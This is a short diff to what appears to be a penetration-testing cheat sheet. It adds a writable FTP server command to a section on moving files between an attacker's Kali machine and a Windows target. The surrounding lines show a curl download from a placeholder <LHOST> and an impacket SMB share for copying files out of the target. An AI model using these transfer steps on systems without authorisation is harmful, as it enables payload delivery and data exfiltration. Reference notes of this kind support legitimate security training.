@@ -463,6 +463,10 @@ curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```powershell
 kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
+
+Kali> python3 -m pyftpdlib -w
+    FTP Server Kali (make sure it is binary)
+ 
 ```
 
 ## Adding Users
